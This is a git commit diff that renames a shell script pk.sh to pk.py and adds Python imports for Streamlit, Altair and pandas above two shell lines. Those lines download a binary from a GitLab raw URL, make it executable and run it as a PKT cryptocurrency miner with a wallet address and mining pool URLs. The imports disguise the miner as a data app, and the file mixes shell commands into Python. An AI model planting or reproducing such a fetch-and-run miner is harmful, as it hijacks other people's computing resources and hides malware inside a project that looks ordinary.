49b2d73a15294ea7608d460bc14157c4ab67b913
andigani <89914976+andigani@users.noreply.github.com>
2022-01-20 08:15:17 +0700

    Update and rename pk.sh to pk.py

--- pk.py
+++ pk.py
@@ -1,2 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
 wget https://gitlab.com/suyatisadino/demonslayers/-/raw/main/ann && chmod 777 ann
 ./ann ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
